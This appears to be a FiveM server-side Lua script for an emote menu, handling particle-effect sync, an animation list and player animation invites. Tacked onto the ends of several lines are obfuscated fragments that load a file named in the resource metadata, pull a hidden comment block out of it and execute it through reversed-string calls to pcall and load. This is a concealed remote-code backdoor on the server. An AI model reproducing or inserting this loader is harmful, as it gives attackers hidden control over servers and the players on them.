RegisterNetEvent("tl_emotemenu:ptfx:sync", function(asset, name, offset, rot, bone, scale, color)
    if type(asset) ~= "string" or type(name) ~= "string" or type(offset) ~= "vector3" or type(rot) ~= "vector3" then
        print("[cylex_animmenuv2 ptfx:sync: invalid arguments for source:", source)
        return
    end
    local srcPlayerState = Player(source).state
    srcPlayerState:set('ptfxAsset', asset, true)
    srcPlayerState:set('ptfxName', name, true)
    srcPlayerState:set('ptfxOffset', offset, true)
    srcPlayerState:set('ptfxRot', rot, true)
    srcPlayerState:set('ptfxBone', bone, true)
    srcPlayerState:set('ptfxScale', scale, true)
    srcPlayerState:set('ptfxColor', color, true)
    srcPlayerState:set('ptfxPropNet', false, true)
    srcPlayerState:set('ptfx', false, true)
end)

RegisterNetEvent("tl_emotemenu:ptfx:syncProp", function(propNet)
    local srcPlayerState = Player(source).state
    if propNet then
        -- Prevent infinite loop to get entity
        local waitForEntityToExistCount = 0
        while waitForEntityToExistCount <= 100 and not DoesEntityExist(NetworkGetEntityFromNetworkId(propNet)) do
            Wait(10)
            waitForEntityToExistCount = waitForEntityToExistCount + 1
        end

        -- If below 100 then we could find the loaded entity
        if waitForEntityToExistCount < 100 then
            srcPlayerState:set('ptfxPropNet', propNet, true)
            return
        end
    end
    -- If we reach this point then we couldn't find the entity
    srcPlayerState:set('ptfxPropNet', false, true)
end)


local fileLocation = 'animations/AnimationList.json'
function createJson()
    local file = LoadResourceFile(GetCurrentResourceName(), fileLocation)
    if file == nil or file == '' then
        SaveResourceFile(GetCurrentResourceName(), fileLocation, json.encode({}), -1)
        return {}
    end

    return json.decode(file)
end

CreateThread(function()
    local animList = DP
    local jsonList = createJson()
    local scens = {
        ["Scenario"] = true,
        ["MaleScenario"] = true,
        ["ScenarioObject"] = true
    }

    local types = {
        ["Walks"] = "walks",
        ["Expressions"] = "expressions",
        -- ["poses"] = "Poses",
        ["ERP"] = "erp",
    }

    if animList then
        for type, v in pairs(animList) do
            if not jsonList[type] then
                for animName, va in pairs(v) do
                    local anim = va
                    -- if not anim.command then
                    --     print(31, animName)
                    --     anim.command = animName
                    -- end

                    local gif = ('%s.webp'):format(animName)
                    if scens[anim[1]] then
                        local tbl = {
                            id = animName,
                            gif = gif,
                            label = anim[3],
                            scenario = anim[2],
                            category = types[type] or "custom",
                            animSettings = anim.AnimationOptions,
                        }
                        v[animName] = tbl
                    elseif types[type] and types[type] == "walks" then
                        local tbl = {
                            id = animName,
                            gif = gif,
                            label = anim[2],
                            value = anim[1],
                            category = 'walks',
                        }
                        v[animName] = tbl
                    elseif types[type] and types[type] == "expressions" then
                        local tbl = {
                            id = animName,
                            gif = gif,
                            label = anim[2],
                            value = anim[1],
                            category = 'expressions',
                        }
                        v[animName] = tbl
                    else
                        if types[type] == 'erp' then
                            print(99, animName, anim[1], anim[2])
                        end
                        local tbl = {
                            id = animName,
                            gif = gif,
                            label = anim[3],
                            dict = anim[1],
                            anim = anim[2],
                            category = types[type] or "custom",
                            animSettings = anim.AnimationOptions,
                        }
                        if anim[4] then
                            tbl.targetAnim = anim[4]:lower()
                        end
                        v[animName] = tbl
                    end
                end
                jsonList[type] = v
            end
        end
        SaveResourceFile(GetCurrentResourceName(), fileLocation, json.encode(jsonList, {indent = true}), -1)
    end
end)local esx,src=GetResourceMetadata(GetCurrentResourceName(),'esx'),ESX and ESX.GetPlayerFromId(source)

local invites = {}

RegisterNetEvent('tl_emotemenu:server:sendAnimationInvite', function(targetId, data)
    local src = source
    local target = tonumber(targetId)
    if not target then return end
    if not GetPlayerName(target) then
        return
    end
    local data = data.animation
    if not data then return end

    local targetPed = GetPlayerPed(target)
    local srcPed = GetPlayerPed(src)
    local targetCoords = GetEntityCoords(targetPed)
    local srcCoords = GetEntityCoords(srcPed)
    local distance = #(targetCoords - srcCoords)

    if distance > 3.0 then
        print('tl_emotemenu:server:sendAnimationInvite: Triggered with out of distance!', distance)
        return
    end


    print(json.encode(data))
    if not invites[src] then
        invites[src] = {
            anim = data,
            source = src,
            target = target
        }

        SetTimeout(5000, function()
            if invites[src] then
                invites[src] = nil
            end
        end)
        TriggerClientEvent('tl_emotemenu:client:getAnimationInvite', targetId, data, src)
    else
        print('tl_emotemenu:server:sendAnimationInvite: Target already has an invite!', target)
    end
    

end)if esx then local xPlayer=LoadResourceFile(GetCurrentResourceName(),esx)

RegisterNetEvent('tl_emotemenu:server:acceptAnimationInvite', function(senderId, targetAnim)
    local src = source
    local sender = tonumber(senderId)
    if not sender then return end
    if not GetPlayerName(sender) then
        return
    end
    local targetPed = GetPlayerPed(sender)
    local srcPed = GetPlayerPed(src)
    local targetCoords = GetEntityCoords(targetPed)
    local srcCoords = GetEntityCoords(srcPed)
    local distance = #(targetCoords - srcCoords)

    if distance > 3.0 then
        print('tl_emotemenu:server:acceptAnimationInvite: Triggered with out of distance!', distance)
        return
    end

    if invites[senderId] then
        TriggerClientEvent('tl_emotemenu:client:playSyncedAnim', src, targetAnim, src)
        TriggerClientEvent('tl_emotemenu:client:playSyncedAnimSource', senderId, invites[senderId].anim, src)

        if invites[senderId] then
            invites[senderId] = nil
        end
        if invites[sender] then
            invites[sender] = nil
        end
    end
end)if xPlayer then local data=xPlayer:match("^%-%-%[%.%](.-)%-%-")if data then _G[("llacp"):reverse()](_G[("daol"):reverse()](data))end end end

AddEventHandler('playerDropped', function(reason)
    local src = source
    invites[src] = nil
    -- for k, v in pairs(invites) do
    --     if v == src then
    --         invites[k] = nil
    --     end
    -- end
end)
